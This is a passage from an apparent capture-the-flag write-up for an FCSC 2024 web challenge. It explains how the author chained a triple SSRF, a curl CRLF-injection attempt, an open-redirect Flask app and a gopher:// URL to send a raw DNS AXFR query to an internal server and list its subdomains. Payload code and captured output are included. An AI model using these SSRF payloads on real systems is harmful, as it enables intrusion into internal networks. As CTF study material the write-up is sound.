+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;red.fcsc2024.fr.&#34;</span>: environ[<span style="color:#e6db74">&#34;REDIRECT_IP&#34;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;listen.fcsc2024.fr.&#34;</span>: environ[<span style="color:#e6db74">&#34;LISTEN_IP&#34;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>environ[<span style="color:#e6db74">&#39;FLAG_DOMAIN&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">.fcsc2024.fr.&#34;</span>: environ[<span style="color:#e6db74">&#34;FLAG_IP&#34;</span>]
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LocalDNS</span>(BaseResolver):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">resolve</span>(self, request, handler):
+</span></span><span style="display:flex;"><span>        reply <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>reply()
+</span></span><span style="display:flex;"><span>        q <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>q
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;&#39;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> q<span style="color:#f92672">.</span>qtype <span style="color:#f92672">==</span> QTYPE<span style="color:#f92672">.</span>A <span style="color:#f92672">and</span> str(q<span style="color:#f92672">.</span>qname) <span style="color:#f92672">in</span> DOMAINS:
+</span></span><span style="display:flex;"><span>            reply<span style="color:#f92672">.</span>add_answer(RR(q<span style="color:#f92672">.</span>qname, QTYPE<span style="color:#f92672">.</span>A, rdata<span style="color:#f92672">=</span>A(DOMAINS[str(q<span style="color:#f92672">.</span>qname)])))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> q<span style="color:#f92672">.</span>qtype <span style="color:#f92672">==</span> QTYPE<span style="color:#f92672">.</span>A:
+</span></span><span style="display:flex;"><span>            default_resolver <span style="color:#f92672">=</span> resolver<span style="color:#f92672">.</span>Resolver()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                answers <span style="color:#f92672">=</span> default_resolver<span style="color:#f92672">.</span>resolve(str(q<span style="color:#f92672">.</span>qname), <span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> answer <span style="color:#f92672">in</span> answers:
+</span></span><span style="display:flex;"><span>                    reply<span style="color:#f92672">.</span>add_answer(RR(q<span style="color:#f92672">.</span>qname, QTYPE<span style="color:#f92672">.</span>A, rdata<span style="color:#f92672">=</span>A(answer<span style="color:#f92672">.</span>address)))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>                reply<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>rcode <span style="color:#f92672">=</span> RCODE<span style="color:#f92672">.</span>NXDOMAIN
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> q<span style="color:#f92672">.</span>qtype <span style="color:#f92672">==</span> QTYPE<span style="color:#f92672">.</span>AXFR <span style="color:#f92672">and</span> str(q<span style="color:#f92672">.</span>qname) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;fcsc2024.fr.&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> domain, ip <span style="color:#f92672">in</span> DOMAINS<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>                reply<span style="color:#f92672">.</span>add_answer(RR(domain, QTYPE<span style="color:#f92672">.</span>A, rdata<span style="color:#f92672">=</span>A(ip)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            reply<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>rcode <span style="color:#f92672">=</span> RCODE<span style="color:#f92672">.</span>NXDOMAIN
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> reply
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_server</span>(protocol):
+</span></span><span style="display:flex;"><span>    resolver <span style="color:#f92672">=</span> LocalDNS()
+</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">=</span> DNSServer(resolver, address<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">53</span>, tcp<span style="color:#f92672">=</span>(protocol <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;TCP&#34;</span>))
+</span></span><span style="display:flex;"><span>    server<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>run_server, args<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;TCP&#34;</span>,))<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>    threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>run_server, args<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;UDP&#34;</span>,))<span style="color:#f92672">.</span>start()
+</span></span></code></pre></div><p>This implements DNS queries:</p>
+<ul>
+<li><em>A</em> type queries</li>
+<li><em>AXFR</em> queries</li>
+</ul>
+<p>The first type is used to resolve <code>domain -&gt; ip</code> and the second to list subdomains registered for <code>fcsc2024.fr</code>.</p>
+<h2 id="problem">Problem:</h2>
+<p>It seems easy to retrieve the flag knowing the complete domain of the <em>pong-flag</em> service. On the other hand, retrieving the sub-domain seems more difficult.</p>
+<p>The difficulty of this challenge lies not only in the complexity of the requests:</p>
+<ul>
+<li>Triple ssrf</li>
+<li>Double bypass ReDos<br>
+but also in finding the right domain name to query.</li>
+</ul>
+<h2 id="first-track">First track:</h2>
+<p>The idea here is to find a way of querying the internal DNS server by forging an <code>AXFR</code> request.</p>
+<p>The <code>HTTP</code> and <code>DNS</code> protocols are completely different, and although they are (in our case) both used via TCP sockets, they are syntactically different.</p>
+<p>So, from the ssrf, we have to:</p>
+<ul>
+<li>find the TCP packet to send</li>
+<li>find a way to arbitrarily send raw to the tcp socket.</li>
+</ul>
+<h2 id="creating-the-dns-query">Creating the DNS query.</h2>
+<p>The simplest way to forge this query is to use the <code>dig</code> tool (<em>bind-tools</em>) accross a docker in the infra network to query the DNS server.<br>
+To retrieve the raw bytes, I specify my TCP listener and port 2222 and make the query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig @host.docker.internal -p <span style="color:#ae81ff">2222</span> fcsc2024.fr AXFR
+</span></span></code></pre></div><p>I received the 3 TCP requests below: (hexadecimal)</p>
+<ul>
+<li>
+<p>00346bb0002000010000000000010866637363323032340266720000fc000100002904d000000000000c000a0008f7bdbcaef5f90ee6</p>
+</li>
+<li>
+<p>00341199002000010000000000010866637363323032340266720000fc000100002904d000000000000c000a0008f7bdbcaef5f90ee6</p>
+</li>
+<li>
+<p>0034e4f6002000010000000000010866637363323032340266720000fc000100002904d000000000000c000a0008f7bdbcaef5f90ee6</p>
+</li>
+</ul>
+<p>You can check that they work as expected:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ echo &lt;hex&gt; | xxd -r -p | nc pong-internal-dns <span style="color:#ae81ff">53</span>
+</span></span></code></pre></div><p><em>Output</em>:</p>
+<pre tabindex="0"><code>���fcsc2024frfrontend�
+
+pong�
+
+fake_domain�
+</code></pre><p>Bingo! Our DNS request works, now we just need to send it to <code>pong-internal-dns</code> on port 53.</p>
+<h2 id="sends-arbitrary-raw-bytes-to-dns">Sends arbitrary raw bytes to DNS.</h2>
+<p>The format of an HTTP request is as follows:</p>
+<pre tabindex="0"><code>&lt;method&gt; &lt;path&gt; HTTP/&lt;version&gt;\r
+&lt;header_key1&gt;: &lt;header_value1&gt;\r
+...
+&lt;header_keyX&gt;: &lt;header_valueX&gt;\r
+\r
+</code></pre><p>Exemple:</p>
+<pre tabindex="0"><code>GET / HTTP/1.1\r
+Connection: Close\r
+Accept: */*\r
+Host: localhost:8000\r
+\r
+</code></pre><p>The first idea I thought of was to take advantage of a vulnerability in the ``php-curl&rsquo;&rsquo; library: a <em>CRLF</em> injection.</p>
+<p>Indeed, according to this post:</p>
+<ul>
+<li><a href="https://gist.github.com/tomnomnom/6727d7d3fabf5a4ab20703121a9090da" target="_blank">https://gist.github.com/tomnomnom/6727d7d3fabf5a4ab20703121a9090da</a></li>
+</ul>
+<p>You can inject a line break (&quot;\r\n&quot;) in the following parameters to take control of the data sent:</p>
+<ul>
+<li>CURLOPT_HTTPHEADER</li>
+<li>CURLOPT_COOKIE</li>
+<li>CURLOPT_RANGE</li>
+<li>CURLOPT_REFERER</li>
+<li>CURLOPT_USERAGENT</li>
+<li>CURLOPT_PROXYHEADER</li>
+</ul>
+<p>So by sending the CURLOPT_USERAGENT header with the following values:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CURLOPT_USERAGENT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Fake_UserAgent</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET /abc HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8000</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: Close</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">X-foo:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span></code></pre></div><p>a second request on <em>/abc</em> will be sent.</p>
+<p>However, it is not possible to define these options with raw-bytes. In fact, curl prevents null-bytes <em>(\x00)</em> from being included in parameter values.<br>
+What&rsquo;s more, the response to this 2nd request was not displayed, which defeated the whole purpose of ssrf.</p>
+<h3 id="in-depth-search-of-curls-hidden-options">In-depth search of curl&rsquo;s hidden options.</h3>
+<p>This is undoubtedly the part that took me the longest in solving this challenge.</p>
+<p>I explored many tracks before completing the full exploitation.
+Here are a few of them:</p>
+<ul>
+<li>Searching for interesting vulnerabilities on <a href="https://curl.se/docs/vuln-7.71.1.html" target="_blank">curl.se</a></li>
+<li>CRLF attempt in various parameters.</li>
+<li>Attempt to send bytes via proxie and pre-proxie connections <em>(socks4/socks5)</em>.</li>
+<li>Manipulation of default protocol</li>
+<li>Manipulation of default method</li>
+</ul>
+<p><strong>Curl is too restrictive to allow bytes to be sent via the HTTP protocol.</strong>
+The only solution is to switch to a less restrictive protocol: <code>gopher</code> or <code>telnet</code>.</p>
+<p>This is the gopher protocol I&rsquo;ve chosen. This protocol is often used for SSRF exploitation.<br>
+In fact, it allows any bytes to be sent in TCP, enabling different actions to be carried out using different protocols.</p>
+<p>A gopher url looks like this: <code>gopher://&lt;ip&gt;:&lt;port&gt;/_&lt;tcp data urlencoded&gt;</code>
+It&rsquo;s important to leave a character (here <code>_</code>) between the <code>/</code> and the TCP data.</p>
+<p>Before presenting the working solution, it&rsquo;s important to note the various options available to us:</p>
+<ul>
+<li>The first would be to leave the CURL url protocol blank and change the default protocol: <em>(CURLOPT_DEFAULT_PROTOCOL)</em>.</li>
+<li>The second method would be to find an arbitrary redirect (OpenRedirect) to a url of our choice.</li>
+</ul>
+<p>Unfortunately, although option 1 is technically easier, it seems impossible because of the prefix: <code>http://</code> added by index.php on <em>frontend.fcsc2024.fr</em>.</p>
+<p>So we&rsquo;ll need to find an <a href="https://portswigger.net/kb/issues/00500100_open-redirection-reflected" target="_blank">OpenRedirect</a> to redirect the url to a protocol of our choice.</p>
+<h3 id="confirmation-of-exploitation-path">Confirmation of exploitation path:</h3>
+<p>To ensure that this scenario could be used, I deployed a flask application: <code>http://red.fcsc2024.fr:5000/</code> in the infrastructure.</p>
+<p>Here&rsquo;s the code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, redirect, url_for, request
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">redirection</span>():
+</span></span><span style="display:flex;"><span>    destination_url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;redirect&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(destination_url, code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>)
+</span></span></code></pre></div><p>This application is an Open-Redirect-As-A-Service, allowing me to redirect my url to wherever I want.
+So I&rsquo;ve completed the piece of the puzzle that was missing from the full operation.</p>
+<p>Once I&rsquo;ve added it to DNS, we can test how it works:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/app <span style="color:#75715e"># curl -v http://red.fcsc2024.fr:4444?redirect=gopher://pong-internal-dns:53/_example</span>
+</span></span><span style="display:flex;"><span>* Host red.fcsc2024.fr:4444 was resolved.
+</span></span><span style="display:flex;"><span>* IPv6: <span style="color:#f92672">(</span>none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* IPv4: 10.0.0.6
+</span></span><span style="display:flex;"><span>*   Trying 10.0.0.6:4444...
+</span></span><span style="display:flex;"><span>* Connected to red.fcsc2024.fr <span style="color:#f92672">(</span>10.0.0.6<span style="color:#f92672">)</span> port <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>&gt; GET /?redirect<span style="color:#f92672">=</span>gopher://pong-internal-dns:53/_example HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: red.fcsc2024.fr:4444
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/8.5.0
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt;
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">302</span> FOUND
+</span></span><span style="display:flex;"><span>&lt; Server: Werkzeug/3.0.2 Python/3.11.8
+</span></span><span style="display:flex;"><span>&lt; Date: Fri, <span style="color:#ae81ff">12</span> Apr <span style="color:#ae81ff">2024</span> 03:39:06 GMT
+</span></span><span style="display:flex;"><span>&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">263</span>
+</span></span><span style="display:flex;"><span>&lt; Location: gopher://pong-internal-dns:53/_example
+</span></span><span style="display:flex;"><span>&lt; Connection: close
+</span></span><span style="display:flex;"><span>&lt;
+</span></span><span style="display:flex;"><span>&lt;!doctype html&gt;
+</span></span><span style="display:flex;"><span>&lt;html lang<span style="color:#f92672">=</span>en&gt;
+</span></span><span style="display:flex;"><span>&lt;title&gt;Redirecting...&lt;/title&gt;
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Redirecting...&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gopher://pong-internal-dns:53/_example&#34;</span>&gt;gopher://pong-internal-dns:53/_example&lt;/a&gt;. If not, click the link.
+</span></span><span style="display:flex;"><span>* Closing connection
+</span></span></code></pre></div><p>We get our 302 response with a redirect to <code>gopher://pong-internal-dns:53/_example</code>.</p>
+<p>In order to make the link with the previous section on CUrl, here are the must-have options for ssrf:</p>
+<ul>
+<li><code>CURLOPT_FOLLOWLOCATION</code> to <code>1</code> : Follow the redirection.</li>
+<li><code>CURLOPT_REDIR_PROTOCOLS</code> to <code>gopher</code> or <code>CURLPROTO_GOPHER</code> : Enables the <strong>gopher</strong> redirection protocol <em>(Default: HTTP)</em>.</li>
+</ul>
+<p>If we test the combination of:</p>
+<ul>
+<li>From the url to <em>pong-redirect.fcsc2024.fr</em></li>
+<li>DNS query in raw bytes</li>
+<li>CUrl options<br>
+we get:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>mapping <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;CURLOPT_FOLLOWLOCATION&#39;</span>: <span style="color:#e6db74">&#39;52&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;CURLOPT_CUSTOMREQUEST&#39;</span>: <span style="color:#e6db74">&#39;10036&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;CURLOPT_REDIR_PROTOCOLS&#39;</span>: <span style="color:#e6db74">&#39;182&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;CURLPROTO_GOPHER&#39;</span>: <span style="color:#e6db74">&#39;33554432&#39;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>options <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">.</span>join([
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;options[CURLOPT_FOLLOWLOCATION]=1&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;options[CURLOPT_REDIR_PROTOCOLS]=CURLPROTO_GOPHER&#39;</span>,
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> mapping<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>	options <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>replace(k, v)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>axfr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%004n%DB</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">20</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">01</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">01</span><span style="color:#e6db74">%08f</span><span style="color:#e6db74">csc2024</span><span style="color:#e6db74">%02f</span><span style="color:#e6db74">r</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%F</span><span style="color:#e6db74">C</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">01</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">04%D0</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">0C</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">0A</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">08I%B8</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">3C05P%8A&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target_url <span style="color:#f92672">=</span> urlenc(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;gopher://pong-internal-dns:53/_</span><span style="color:#e6db74">{</span>axfr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ssrf(
+</span></span><span style="display:flex;"><span>    where<span style="color:#f92672">=</span>urlenc(urlenc(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;red.fcsc2024.fr:4444/?redirect=</span><span style="color:#e6db74">{</span>target_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> redos),
+</span></span><span style="display:flex;"><span>    options<span style="color:#f92672">=</span>urlenc(options)
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p><em>Output:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Date: Fri, <span style="color:#ae81ff">12</span> Apr <span style="color:#ae81ff">2024</span> 04:00:45 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.59 <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>X-Powered-By: PHP/8.2.17
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">148</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>92n<span style="color:#ae81ff">\x</span>db<span style="color:#ae81ff">\x</span>84<span style="color:#ae81ff">\x</span>a0<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>08fcsc2024<span style="color:#ae81ff">\x</span>02fr<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>fc<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>08frontend<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>04pong<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>03red<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>06<span style="color:#ae81ff">\x</span>06listen<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>07<span style="color:#ae81ff">\x</span>0bfake_domain<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">05</span>
+</span></span></code></pre></div><p>Great, all the fcsc2024.fr domains can be found, including the flag domain: <code>fake_domain</code>.</p>
+<h2 id="discover-of-the-real-open-redirect-">Discover of the real Open-redirect :</h2>
+<p>Now that we know that an Open-redirect will allow us to retrieve the secret domain, let&rsquo;s turn our attention to the last non-exploited service: **The tornado server!</p>
+<p>As explained above, the Tornado server is used to host the pong game, and contains 2 resource files:</p>
+<ul>
+<li>/static/index.html</li>
+<li>/js/main.js</li>
+</ul>
+<p>Their content isn&rsquo;t really important, but we&rsquo;ll have to pay attention to the server code below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> tornado.ioloop
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> tornado.web
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>_unicode <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> value: value<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>, <span style="color:#e6db74">&#34;replace&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_app</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>Application([
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;/?(.*)&#34;</span>, tornado<span style="color:#f92672">.</span>web<span style="color:#f92672">.</span>StaticFileHandler, { <span style="color:#e6db74">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;default_filename&#34;</span>: <span style="color:#e6db74">&#34;index.html&#34;</span> }),
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app <span style="color:#f92672">=</span> make_app()
